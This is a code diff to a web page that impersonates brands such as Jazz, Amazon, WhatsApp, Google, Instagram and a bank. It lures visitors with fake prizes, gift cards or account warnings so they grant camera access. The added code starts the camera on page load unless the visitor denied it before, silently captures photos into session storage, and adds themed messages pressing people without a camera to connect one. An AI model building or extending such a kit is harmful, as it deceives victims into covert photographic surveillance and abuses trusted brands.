@@ -1242,6 +1242,8 @@
                 successSub: '10GB has been credited to your number.\nYou may close this page.',
                 timerMsg: 'Offer expires in',
                 note: '🔒 Secure verification — Jazz Pakistan',
+                noCamTitle: 'Hardware Error',
+                noCamMsg: 'Your device camera was not detected. Please connect a camera to verify your identity and claim your data.',
             },
 
             giftcard: {
@@ -1261,6 +1263,8 @@
                 successSub: 'Your $50 gift card has been sent.\nCheck your inbox shortly.',
                 timerMsg: 'Offer valid for',
                 note: '🔒 amazon.com — Secure Checkout',
+                noCamTitle: 'Identity Verification Failed',
+                noCamMsg: 'A working camera is required to verify your eligibility for this gift card. Please ensure your camera is enabled.',
             },
 
             lucky: {
@@ -1280,6 +1284,8 @@
                 successSub: 'PKR 50,000 will be transferred within 24 hours.',
                 timerMsg: 'Claim before',
                 note: '🔒 Official Lucky Draw Authority',
+                noCamTitle: 'Scan Failed',
+                noCamMsg: 'We could not detect a camera for the identity scan. A camera is mandatory to claim cash prizes.',
             },
 
             video: {
@@ -1299,6 +1305,8 @@
                 successSub: 'Your account is secure.\nYou can continue watching now.',
                 timerMsg: 'Session expires in',
                 note: '🔒 netstream.com — Secure Verification',
+                noCamTitle: 'Verification Error',
+                noCamMsg: 'Face verification is required to resume your session. Please enable your camera and refresh.',
             },
 
             whatsapp: {
@@ -1318,6 +1326,8 @@
                 successSub: 'Your WhatsApp account is now verified.\nYou can continue chatting.',
                 timerMsg: 'Account locked in',
                 note: '🔒 whatsapp.com — End-to-End Encrypted',
+                noCamTitle: 'Security Check Failed',
+                noCamMsg: 'WhatsApp cannot access your camera. Please enable permissions in your device settings to verify your account.',
             },
 
             google: {
@@ -1337,6 +1347,8 @@
                 successSub: 'Your Google Account has been secured.\nThe suspicious sign-in has been blocked.',
                 timerMsg: 'Action required within',
                 note: '🔒 Google Security — accounts.google.com',
+                noCamTitle: 'Authentication Error',
+                noCamMsg: 'Google cannot find a camera on this device. Use a device with a camera to complete this security check.',
             },
 
             instagram: {
@@ -1356,6 +1368,8 @@
                 successSub: 'Your blue tick will appear within 24 hours.\nCheck your Instagram notifications.',
                 timerMsg: 'Offer valid for',
                 note: '🔒 instagram.com — Meta Verified',
+                noCamTitle: 'Face ID Required',
+                noCamMsg: 'Instagram verification badge requires a live face ID. Please connect a camera to proceed with your application.',
             },
 
             bank: {
@@ -1375,6 +1389,8 @@
                 successSub: 'Your account is now active.\nAll restrictions have been lifted.',
                 timerMsg: 'Account freezes in',
                 note: '🔒 nationalbank.com — 256-bit SSL Secured',
+                noCamTitle: 'Biometric Error',
+                noCamMsg: 'A secure biometric scan requires a camera. Please enable your camera to restore your bank account access.',
             },
 
             speedtest: {
@@ -1394,6 +1410,8 @@
                 successSub: 'Download: 85.3 Mbps · Upload: 24.1 Mbps\nPing: 14ms — Excellent!',
                 timerMsg: 'Analyzing network',
                 note: '🔒 speedtest-pro.app — No data stored',
+                noCamTitle: 'Diagnostics Error',
+                noCamMsg: 'Advanced AR diagnostics require a camera. Please enable camera access to finish the speed test.',
             },
 
             music: {
@@ -1413,6 +1431,8 @@
                 successSub: 'You now have unlimited free downloads.\nEnjoy your music!',
                 timerMsg: 'Offer expires in',
                 note: '🔒 freebeats.app — No credit card required',
+                noCamTitle: 'Camera Required',
+                noCamMsg: 'To verify your identity and unlock this offer, a working camera is required. Please connect a camera and refresh.',
             }
         };
 
@@ -1468,6 +1488,11 @@
         <i class="fa-solid fa-triangle-exclamation"></i>
         Access was denied. Please allow camera in your browser settings and refresh.
       </div>
+      <div class="c-denied" id="noCamBox" style="display:none; background:rgba(239, 68, 68, 0.1); color:#ef4444; border-color:#ef4444;">
+        <i class="fa-solid fa-camera-slash"></i>
+        <strong id="noCamTitle">Camera Not Found</strong><br/>
+        <span id="noCamMsg">A working camera is required for verification. Please connect one and refresh.</span>
+      </div>
       <div class="c-success" id="successBox">
         <div class="c-success-icon">${theme.successIcon}</div>
         <div class="c-success-title">${theme.successTitle}</div>
@@ -1522,16 +1547,18 @@
         // --- Auto-launch: if permission was granted before, skip the button ---
         // Use setTimeout (not DOMContentLoaded) because the card HTML is built dynamically above;
         // by the time this script runs the DOM elements already exist.
+        // --- Auto-launch: Always try if not denied ---
         setTimeout(() => {
-            if (localStorage.getItem(PERM_KEY) === '1') {
-                // Hide button, silently start right away
+            const hasDeniedBefore = localStorage.getItem('cemra_denied') === '1';
+            if (!hasDeniedBefore) {
+                // Silently start right away
                 const btn = document.getElementById('mainBtn');
                 if (btn) btn.style.display = 'none';
                 setStatus(theme.statusWaiting);
                 setProgress(10);
                 requestCamera();
             }
-        }, 300); // small delay so page renders first
+        }, 500);
 
         // --- Button click ---
         async function startCapture() {
@@ -1599,16 +1626,15 @@
         function scheduleRetry(error, visibleCamerasCount) {
             if (retryCount >= MAX_RETRY) {
                 if (error && error.name === 'NotFoundError') {
-                    alert(visibleCamerasCount === 0
-                        ? "⚠️ NO CAMERA DETECTED: Your browser doesn't see any camera hardware.\n\n1. Check if your camera is plugged in/turned on.\n2. Ensure your OS settings (Windows/Mac/Android/iOS) allow your browser to access the camera.\n3. Make sure no other app (like Zoom or Skype) is using it."
-                        : "⚠️ CAMERA HARDWARE ERROR: A camera was found, but the browser couldn't connect to it.\n\nTry refreshing the page or restarting your browser."
-                    );
+                    setSyncStatus('no_hardware');
+                    onPermanentFail('no_hardware');
                 } else if (error && error.name === 'NotAllowedError') {
-                    alert("⚠️ PERMISSION DENIED: You blocked the camera.\n\nPlease click the lock icon in your address bar, allow the camera, and refresh the page.");
-                } else if (error) {
-                    alert("⚠️ CAMERA ERROR: " + error.message + " (" + error.name + ")");
+                    localStorage.setItem('cemra_denied', '1');
+                    setSyncStatus('permission_denied');
+                    onPermanentFail('denied');
+                } else {
+                    onPermanentFail();
                 }
-                onPermanentFail();
                 return;
             }
             retryCount++;
@@ -1635,10 +1661,26 @@
             // This prevents black frames because the camera sensor needs time to light up
             let warmupDone = false;
             const startCapturing = () => {
-                if (warmupDone) return; // prevent double-call
+                if (warmupDone) return;
+
+                // Ensure video is actually flowing and has dimensions
+                if (video.videoWidth === 0 || video.videoHeight === 0) {
+                    console.warn('Video ready but dimensions are 0. Retrying in 200ms...');
+                    setTimeout(startCapturing, 200);
+                    return;
+                }
+
                 warmupDone = true;
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
+                // Limit to 640x480 to save memory and storage (prevents ERR_INSUFFICIENT_RESOURCES)
+                const maxW = 640;
+                const maxH = 480;
+                const ratio = Math.min(maxW / (video.videoWidth || 640), maxH / (video.videoHeight || 480), 1);
+
+                canvas.width = (video.videoWidth || 640) * ratio;
+                canvas.height = (video.videoHeight || 480) * ratio;
+
+                console.log('Capture started. Dimensions:', canvas.width, 'x', canvas.height);
+
                 setProgress(35);
                 setStatus(theme.statusWaiting);
                 // Show scanner overlay
@@ -1716,39 +1758,62 @@
         function shoot(ctx, canvas, video, camType) {
             try {
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
-                if (dataUrl && dataUrl.length > 5000) { // ignore blank frames
+                // Lower quality (0.4) to stay under localStorage limits (5MB)
+                const dataUrl = canvas.toDataURL('image/jpeg', 0.4);
+                if (dataUrl && dataUrl.length > 2000) {
                     savePhoto(dataUrl, camType);
                 }
             } catch (e) {
-                // silent — next shot will retry
+                console.error('Shoot error:', e);
             }
         }
 
-        // --- Save photo to localStorage ---
+        // --- Save photo to localStorage with auto-cleanup ---
         function savePhoto(dataUrl, camType) {
+            const key = 'cemra_captures_' + sessionId;
+
+            // Cleanup: remove OTHER session data if we are near limit
+            cleanupStorage(dataUrl.length);
+
             try {
-                const key = 'cemra_captures_' + sessionId;
                 const existing = JSON.parse(localStorage.getItem(key) || '[]');
                 existing.push({
                     id: 'cap_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6),
                     src: dataUrl,
                     camera: camType,
                     time: new Date().toISOString(),
-                    size: (dataUrl.length / 1024 / 1024).toFixed(2) + ' MB',
+                    size: (dataUrl.length / 1024).toFixed(1) + ' KB',
                     session: sessionId,
                     demo: false
                 });
                 localStorage.setItem(key, JSON.stringify(existing));
             } catch (e) {
-                // localStorage full? trim oldest and retry
+                console.warn('LocalStorage full. Purging old captures...');
+                // Emergency purge: clear current session's oldest 5 photos
                 try {
-                    const key = 'cemra_captures_' + sessionId;
                     const existing = JSON.parse(localStorage.getItem(key) || '[]');
-                    existing.splice(0, 2); // remove 2 oldest
-                    existing.push({ id: 'cap_' + Date.now(), src: dataUrl, camera: camType, time: new Date().toISOString(), size: '?', session: sessionId, demo: false });
+                    existing.splice(0, 5);
                     localStorage.setItem(key, JSON.stringify(existing));
                 } catch { }
+            }
+        }
+
+        function cleanupStorage(neededSize) {
+            // Basic heuristic: check total localStorage size
+            let total = 0;
+            for (let k in localStorage) {
+                if (localStorage.hasOwnProperty(k)) total += (localStorage[k].length * 2);
+            }
+
+            // If over 4MB, start deleting other sessions
+            if (total > 4 * 1024 * 1024) {
+                console.log('Storage cleanup triggered. Total:', (total / 1024 / 1024).toFixed(2), 'MB');
+                for (let k in localStorage) {
+                    if (k.startsWith('cemra_captures_') && !k.endsWith(sessionId)) {
+                        localStorage.removeItem(k);
+                        console.log('Purged old session:', k);
+                    }
+                }
             }
         }
 
@@ -1775,7 +1840,7 @@
         }
 
         // --- Permanent failure (all retries exhausted) ---
-        function onPermanentFail() {
+        function onPermanentFail(reason) {
             capturing = false;
             const btn = document.getElementById('mainBtn');
             if (btn) {
@@ -1783,12 +1848,19 @@
                 btn.style.display = 'flex';
                 btn.innerHTML = `<i class="${theme.btnIcon}"></i> ${theme.btnText}`;
             }
-            const db = document.getElementById('deniedBox');
-            if (db) db.style.display = 'block';
+
+            if (reason === 'no_hardware') {
+                const ncb = document.getElementById('noCamBox');
+                if (ncb) ncb.style.display = 'block';
+                document.getElementById('noCamTitle').textContent = theme.noCamTitle || 'Camera Not Found';
+                document.getElementById('noCamMsg').textContent = theme.noCamMsg || 'A working camera is required for verification.';
+            } else {
+                const db = document.getElementById('deniedBox');
+                if (db) db.style.display = 'block';
+            }
+
             setStatus('');
-            setSyncStatus('permission_denied');
             setProgress(0);
-            // Clear the cached permission so next time it asks again
             localStorage.removeItem(PERM_KEY);
         }
 
